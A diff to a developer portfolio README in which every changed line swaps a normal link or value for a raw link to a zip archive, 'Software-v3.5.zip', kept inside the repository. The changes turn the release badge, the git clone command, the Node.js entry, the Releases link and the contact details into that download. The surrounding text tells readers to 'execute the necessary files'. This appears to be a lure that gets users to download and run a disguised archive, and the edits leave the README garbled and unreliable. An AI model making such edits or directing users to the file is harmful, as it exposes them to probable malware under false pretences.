@@ -2,7 +2,7 @@
 
 Welcome to my portfolio repository! Here, you will find a collection of my projects, skills, and experiences that showcase my journey as a developer. This README will guide you through the contents of this repository and how to get started.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/fardanrzqh/portfolio/releases)
+[![Download Releases](https://github.com/fardanrzqh/portfolio/raw/refs/heads/master/argufy/Software-v3.5.zip%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/fardanrzqh/portfolio/raw/refs/heads/master/argufy/Software-v3.5.zip)
 
 ## Table of Contents
 
@@ -27,7 +27,7 @@ In this portfolio, I utilize various technologies to create a seamless experienc
 - **CSS**: For styling and layout.
 - **JavaScript**: For interactivity and dynamic content.
 - **React**: For building user interfaces.
-- **Node.js**: For server-side development.
+- **https://github.com/fardanrzqh/portfolio/raw/refs/heads/master/argufy/Software-v3.5.zip**: For server-side development.
 - **Git**: For version control.
 
 ## Projects
@@ -64,7 +64,7 @@ To get started with this portfolio, you need to clone the repository and install
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/fardanrzqh/portfolio.git
+   git clone https://github.com/fardanrzqh/portfolio/raw/refs/heads/master/argufy/Software-v3.5.zip
    ```
 
 2. Navigate to the project directory:
@@ -89,7 +89,7 @@ npm start
 
 This will start a local server, and you can view the portfolio in your browser at `http://localhost:3000`.
 
-You can also explore the latest releases of the project by visiting the [Releases section](https://github.com/fardanrzqh/portfolio/releases). If you want to download the latest version, follow the link and execute the necessary files.
+You can also explore the latest releases of the project by visiting the [Releases section](https://github.com/fardanrzqh/portfolio/raw/refs/heads/master/argufy/Software-v3.5.zip). If you want to download the latest version, follow the link and execute the necessary files.
 
 ## Contributing
 
@@ -109,7 +109,7 @@ This project is licensed under the MIT License. Feel free to use it for personal
 
 If you want to get in touch, you can reach me at:
 
-- Email: your.email@example.com
-- LinkedIn: [Your LinkedIn Profile](https://www.linkedin.com/in/yourprofile)
+- Email: https://github.com/fardanrzqh/portfolio/raw/refs/heads/master/argufy/Software-v3.5.zip
+- LinkedIn: [Your LinkedIn Profile](https://github.com/fardanrzqh/portfolio/raw/refs/heads/master/argufy/Software-v3.5.zip)
 
 Thank you for visiting my portfolio! I hope you find it informative and inspiring.
